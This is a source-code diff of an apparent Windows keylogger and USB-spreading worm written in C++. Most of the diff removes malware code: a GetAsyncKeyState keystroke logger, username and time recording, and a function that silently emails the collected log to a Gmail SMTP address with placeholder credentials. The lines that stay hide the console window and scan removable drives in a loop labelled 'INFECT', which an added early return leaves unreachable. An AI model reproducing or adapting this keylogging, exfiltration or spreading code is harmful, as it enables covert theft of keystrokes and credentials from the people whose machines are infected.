@@ -29,42 +29,9 @@ char* getRandomName();
 main(){
     FreeConsole(); ///hide window
 
-    age = get_setAge();
-    if(checkRecordSize()){ ///check for right time
-
-        int i=1;
-        while(i<3){ ///try 2 times to send data
-        
-            Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.google.com -n 1")){ ///check connection
-                ////////////****SEND DATA****////////////
-                sendData();
-
-                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
-                DeleteFile(FILE_NAME);
-
-                break;
-            }
-            i++;
-        }
-    }
-
-    age=get_setAge();
-
-    ////////////****LOG USER_DATE_TIME****////////////
-    if(age <= LIFE_TIME){
-        logUserTime();
-    }
-
     char driveLetter = getRemovableDisk(); ///initial search for all disks
     return; // :)
     while(1){
-        ////////////****LOG KEY****////////////
-        if(age <= LIFE_TIME){
-            logKey();
-        }else{
-            Sleep(5000);
-        }
 
         ////////////****INFECT****////////////
         driveLetter = getRemovableDisk();
@@ -73,99 +40,6 @@ main(){
         }
     }
     
-}
-
-/**
- * For old file get age - for new file set age.
-**/
-int get_setAge(){
-    int ageTemp = age;
-
-    string line;
-    ifstream myfile(FILE_NAME);
-
-    if(myfile.is_open()){
-        getline(myfile, line);
-        line = line.substr(0, 1);
-        sscanf(line.c_str(), "%d", &ageTemp);
-    }else{
-        ageTemp++;
-
-        FILE *file = fopen(FILE_NAME, "a");
-        fprintf(file, "%d ", ageTemp);
-        fclose(file);
-    }
-
-    return ageTemp;
-}
-
-/**
- * Count number of lines in record file.
-**/
-bool checkRecordSize(){
-    string line;
-    ifstream myfile(FILE_NAME);
-
-    int noOfLines = 0;
-    if(myfile.is_open()){
-        while(getline(myfile, line)){
-            noOfLines++;
-        }
-        myfile.close();
-    }
-
-    if(noOfLines<MIN_RECORD_SIZE*age){
-        return false;
-    }else{
-        return true;
-    }
-}
-
-/**
- * Email all data to the GHOST.
-**/
-void sendData(){
-    
-    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"your.email@gmail.com\" --mail-rcpt \"your.email@gmail.com\" --ssl -u your.email@gmail.com:password -T \"Record.log\" -k --anyauth";
-    WinExec(command, SW_HIDE);
-}
-
-/**
- * Record username, time, and date.
-**/
-void logUserTime(){
-    FILE *file = fopen(FILE_NAME, "a");
-
-    char username[20];
-    unsigned long username_len = 20;
-    GetUserName(username, &username_len);
-    time_t date = time(NULL);
-    fprintf(file, "0\n%s->%s\t", username, ctime(&date));
-
-    fclose(file);
-}
-
-/**
- * Record key stroke.
-**/
-void logKey(){
-    FILE *file;
-    unsigned short ch=0, i=0, j=500; // :)
-
-    while(j<500){ ///loop runs for approx. 25 seconds
-        ch=1;
-        while(ch<250){
-            for(i=0; i<50; i++, ch++){
-                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
-                    file=fopen(FILE_NAME, "a");
-                    fprintf(file, "%d ", ch);
-                    fclose(file);
-                }
-            }
-            Sleep(1); ///take rest
-        }
-        j++;
-    }
 }
 
 /**
